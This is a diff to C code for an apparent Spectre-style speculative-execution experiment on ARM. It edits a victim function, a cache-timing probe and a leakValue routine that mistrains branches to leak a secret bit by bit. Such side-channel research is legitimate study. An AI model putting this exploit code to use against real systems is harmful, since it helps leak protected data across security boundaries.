@@ -5,6 +5,7 @@
 #include <arm_neon.h>
 #include "timing.h"
 #include "cache.h"
+#include <assert.h>
 // #include <x86intrin.h>
 // #include <xmmintrin.h>
 
@@ -30,10 +31,11 @@ int secret __attribute__((aligned(2048)))= 0xdeadbabe ;
 //big_array has to be this size!
 //static uint32_t big_array[33554432] __attribute__((aligned(128)));
 
-double __attribute__((optnone)) victim_function(register int bit, int isPublic)
+void victim_function(register int bit, int isPublic)
 {
     // for (volatile int i = 0; i < 1000; i++);
-    // memory_fence();
+    //memory_fence();
+    //memory_access(&global_variable);
 
 
     if (isPublic < array[0x2 * STRIDE]) {
@@ -49,11 +51,11 @@ double __attribute__((optnone)) victim_function(register int bit, int isPublic)
             "fmul d0, d0, d0\n\t"  // Multiply the value in d0 by itself
             ".endr\n\t"
         );
-        memory_access(&global_variable);
+        //memory_access(&global_variable);
 
   }
 
-  return 0;
+  return ;
 }
 
 
@@ -104,7 +106,7 @@ int leakValue(int bit){
         // If this is an attack call and the mistraining was successful, an entry of array2 will be cached
         //  directly dependend on the entry in array1 we want to leak!
         victim_function(bit, x);
-        // memory_fence();
+        memory_fence();
 
      //noops
     //asm volatile (".rept 5000;\nnop;\n.endr;");
@@ -117,9 +119,10 @@ int leakValue(int bit){
     uint64_t time;
 
     // measure time
-    time = probe(&array[0x2 * ENTRY_SIZE]);
-    
-    num_hits += (time < THRESHOLD) && time; // && time makes sure the time wasn't 0 (0 = the timer is not running)
+    time = probe(&global_variable);
+   
+    //assert(time != 0);
+    num_hits += (time < THRESHOLD); // && time makes sure the time wasn't 0 (0 = the timer is not running)
     
     
     // return offset of array2 with most cache hits 
